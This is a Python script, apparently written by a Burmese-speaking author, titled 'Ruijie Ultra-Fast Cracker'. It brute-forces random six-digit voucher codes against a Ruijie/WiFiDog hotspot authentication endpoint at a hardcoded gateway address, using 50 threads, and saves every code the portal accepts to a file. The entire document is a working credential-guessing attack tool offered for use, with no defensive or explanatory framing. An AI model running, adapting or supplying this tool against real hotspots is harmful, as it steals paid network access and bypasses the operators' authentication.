import sys, os, hashlib, requests, time, random
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, init

init(autoreset=True)

# Canary Data
TARGET_IP = "192.168.110.1"
GW_ID = "58b4bbd9c1e9"
GW_SN = "H1U42FJ004707"

FOUND_VOUCHERS = []
MAX_VOUCHERS = 10

def check_voucher(v):
    global FOUND_VOUCHERS
    if len(FOUND_VOUCHERS) >= MAX_VOUCHERS:
        return

    url = f"http://{TARGET_IP}:2060/wifidog/auth"
    params = {"token": v, "gw_id": GW_ID, "gw_sn": GW_SN}
    
    try:
        # Timeout ကို တိုတိုထားပြီး မြန်မြန်စစ်မယ်
        res = requests.get(url, params=params, timeout=1.5)
        
        # Testing status ကို မြင်ရအောင်
        sys.stdout.write(f"\r{Fore.WHITE}[-] Scanning: {Fore.YELLOW}{v} {Fore.CYAN}(Found: {len(FOUND_VOUCHERS)})")
        sys.stdout.flush()

        if "success" in res.text.lower() or res.status_code == 302:
            if v not in FOUND_VOUCHERS:
                FOUND_VOUCHERS.append(v)
                print(f"\n{Fore.GREEN}[✔] VOUCHER {len(FOUND_VOUCHERS)} FOUND: {v}")
                # ဖိုင်ထဲမှာ သိမ်းထားမယ်
                with open("found_vouchers.txt", "a") as f:
                    f.write(f"{v}\n")
    except:
        pass

def start_cracking():
    print(f"{Fore.MAGENTA}========================================")
    print(f"{Fore.WHITE}   RUIJIE ULTRA-FAST CRACKER (THREADED)")
    print(f"{Fore.MAGENTA}========================================")
    
    # Thread 50 ခွဲပြီး တစ်ပြိုင်တည်း ပစ်မယ် (ဖုန်းမဟန်းအောင် ဒီလောက်ပဲ ထားတာ အကောင်းဆုံးပါ)
    with ThreadPoolExecutor(max_workers=50) as executor:
        while len(FOUND_VOUCHERS) < MAX_VOUCHERS:
            # Random ဂဏန်း ၆ လုံး ထုတ်မယ်
            v_list = [str(random.randint(100000, 999999)) for _ in range(100)]
            executor.map(check_voucher, v_list)
            
    print(f"\n\n{Fore.YELLOW}🎉 TASK COMPLETE: {MAX_VOUCHERS} VOUCHERS FOUND!")
    print(f"{Fore.GREEN}Check 'found_vouchers.txt' for the list.")

if __name__ == "__main__":
    os.system('clear')
    try:
        start_cracking()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Paused by User.")
